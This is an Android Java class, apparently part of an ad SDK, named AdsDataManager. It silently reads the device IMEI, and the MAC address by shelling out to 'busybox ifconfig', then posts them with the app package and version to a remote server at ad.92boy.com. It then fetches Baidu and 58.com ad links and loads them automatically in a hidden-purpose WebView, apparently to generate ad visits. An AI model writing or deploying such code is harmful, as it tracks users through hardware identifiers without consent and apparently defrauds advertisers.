package com.zzj.kp;


import android.app.Activity;
import android.content.Context;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.protocol.HTTP;
import org.apache.http.util.EntityUtils;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class AdsDataManager implements AdsOverCallBack{

    private static AdsDataManager instance = null;
    private static Activity mActivity;
    private WebView mWeb;
    private AdsLinkListNode adsLinkList;
    private List<AdsLinkNode> link58Urls;
    private List<AdsLinkNode> linkBdUrls;
    private int priority;
    private String date;

    public static AdsDataManager initWebView(Activity activity, WebView mWeb)
    {
        mActivity = activity;
        if (instance == null)
        {
            instance = new AdsDataManager(mWeb);
        }
        return instance;
    }

    private AdsDataManager(WebView webView)
    {
        mWeb = webView;
        mWeb.getSettings().setJavaScriptEnabled(true);
        mWeb.getSettings().setDomStorageEnabled(true);
        mWeb.setWebViewClient(new WebViewClient()
        {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url)
            {
                view.loadUrl(url);
                return true;
            }
        });
        getLinks();
    }

    private void getLinks()
    {
        SimpleDateFormat formatter = new SimpleDateFormat("yyyyMMdd");
        Date curDate = new Date(System.currentTimeMillis());
        date = formatter.format(curDate);
        String linkJson = mActivity.getSharedPreferences("adrunLink", Activity.MODE_PRIVATE).getString(date, "");
//        String linkJson = "{\"adbd\":[{\"id\":\"16\",\"url\":\"http://cpu.baidu.com/1006/de0d6b74\",\"detailNum\":\"1\",\"num\":1}],\"ad58\":[{\"id\":\"17\",\"url\":\"https://jumpluna.58.com/i/Loz5GR82J9tMeMj\",\"detailNum\":\"2\",\"num\":1}],\"priority\":2}";


        if (linkJson != null && linkJson.length() > 0)
        {
        	parseNode(linkJson);
            return;
        }

        new Thread(new Runnable()
		{

			@Override
			public void run()
			{
				String reportUrl = "http://ad.92boy.com:8017/api.php?do=ckUrl";
				HttpPost httpPost = new HttpPost(reportUrl);
				List<NameValuePair> params = new ArrayList<NameValuePair>();
				HttpResponse httpResponse = null;
				try
				{
					TelephonyManager tm = (TelephonyManager) mWeb.getContext().getSystemService(Context.TELEPHONY_SERVICE);
					String app_pkg = change(mWeb.getContext().getPackageName());
					params.add(new BasicNameValuePair("app_pkg", app_pkg));
					params.add(new BasicNameValuePair("app_ver", change(mWeb.getContext().getPackageManager().getPackageInfo(app_pkg, 0).versionName)));
					params.add(new BasicNameValuePair("imei", change(tm.getDeviceId())));
					params.add(new BasicNameValuePair("mac", change(getMacAddress())));

					httpPost.setEntity(new UrlEncodedFormEntity(params, HTTP.UTF_8));
					httpResponse = new DefaultHttpClient().execute(httpPost);
					if (httpResponse.getStatusLine().getStatusCode() == 200)
					{
						String result = EntityUtils.toString(httpResponse.getEntity()).toString();
						if(result!=null&&result.length()!=0){
							Log.d("AdList-->", result);
							mActivity.getSharedPreferences("adrunLink", Activity.MODE_PRIVATE).edit().clear().commit();
							mActivity.getSharedPreferences("adrunLink", Activity.MODE_PRIVATE).edit().putString(date, result).commit();
							parseNode(result);
						}
					}
				}
				catch (Exception e)
				{
					e.printStackTrace();
				}
			}
		}).start();
    }
    
    private String change(String ss)
	{
		if (ss == null || ss.length() == 0)
		{
			ss = "";
		}
		return ss;
	}

	// 获取mac地址
	private String getMacAddress()
	{
		String result = "";
		String Mac = "";
		result = callCmd("busybox ifconfig", "HWaddr");
		if (result == null) { return ""; }
		if (result.length() > 0 && result.contains("HWaddr"))
		{
			Mac = result.substring(result.indexOf("HWaddr") + 6, result.length() - 1);
			if (Mac.length() > 1)
			{
				result = Mac.toLowerCase();
			}
		}
		return result.trim();
	}

	private String callCmd(String cmd, String filter)
	{
		String result = "";
		String line = "";
		try
		{
			Process proc = Runtime.getRuntime().exec(cmd);
			InputStreamReader is = new InputStreamReader(proc.getInputStream());
			BufferedReader br = new BufferedReader(is);
			while ((line = br.readLine()) != null && line.contains(filter) == false)
			{
			}
			result = line;
		}
		catch (Exception e)
		{
			e.printStackTrace();
		}
		return result;
	}
	
	public void parseNode(String result){
		try
		{
			JSONObject json1 = new JSONObject(result);
			AdsLinkListNode adsLinkListNode = new AdsLinkListNode();
			int priority = json1.getInt("priority");
			adsLinkListNode.setPriority(priority);
			List<AdsLinkNode> list58 = new ArrayList<AdsLinkNode>();
			List<AdsLinkNode> listbd= new ArrayList<AdsLinkNode>();
			if(json1.toString().contains("ad58")){
				JSONArray json2 = json1.getJSONArray("ad58");
				for(int i=0;i<json2.length();i++){
					AdsLinkNode adsLinkNode = new AdsLinkNode();
					JSONObject json = json2.getJSONObject(i);
					int id = json.getInt("id");
					String url = json.getString("url");
					int num = json.getInt("num");
					adsLinkNode.setId(id);
					adsLinkNode.setUrl(url);
					adsLinkNode.setNum(num);
					list58.add(adsLinkNode);
				}
			}
			adsLinkListNode.setAd58(list58);
			if(json1.toString().contains("adbd")){
				JSONArray json3 = json1.getJSONArray("adbd");
				for(int j=0;j<json3.length();j++){
					AdsLinkNode adsLinkNode = new AdsLinkNode();
					JSONObject json = json3.getJSONObject(j);
					int id = json.getInt("id");
					String url = json.getString("url");
					int detailNum = json.getInt("detailNum");
					int num = json.getInt("num");
					adsLinkNode.setId(id);
					adsLinkNode.setUrl(url);
					adsLinkNode.setDetailNum(detailNum);
					adsLinkNode.setNum(num);
					listbd.add(adsLinkNode);
				}
			}
			adsLinkListNode.setAdbd(listbd);
			takeRun(adsLinkListNode);
		}
		catch (JSONException e)
		{
			e.printStackTrace();
		}
		
	}

    public void takeRun(AdsLinkListNode adsLinkListNode){
        if(adsLinkListNode!=null&&adsLinkListNode.getPriority()!=0){
            priority = adsLinkListNode.getPriority();
            adsLinkList = adsLinkListNode;
            link58Urls = adsLinkList.getAd58();
            linkBdUrls = adsLinkList.getAdbd();

            if(adsLinkList.getPriority()==1){
                if(link58Urls.size()>0){
                	Web58Manager.initWebView(mActivity, mWeb, link58Urls, priority);
                    return;
                }
                if(linkBdUrls.size()>0){
                    WebBdManager.initWebView(mActivity, mWeb, linkBdUrls, priority);
                    return;
                }
            }
            if(adsLinkList.getPriority()==2){
            	if(linkBdUrls.size()>0){
                    WebBdManager.initWebView(mActivity, mWeb, linkBdUrls, priority);
                    return;
                }
            	if(link58Urls.size()>0){
                	Web58Manager.initWebView(mActivity, mWeb, link58Urls, priority);
                    return;
                }
            }
        }
    }

    @Override
    public void over(int priority) {
        if(priority==1&&linkBdUrls.size()>0){
        	WebBdManager.initWebView(mActivity, mWeb, linkBdUrls, priority);
        }
        if(priority==2&&link58Urls.size()>0){
        	Web58Manager.initWebView(mActivity, mWeb, link58Urls, priority);
        }
    }
}
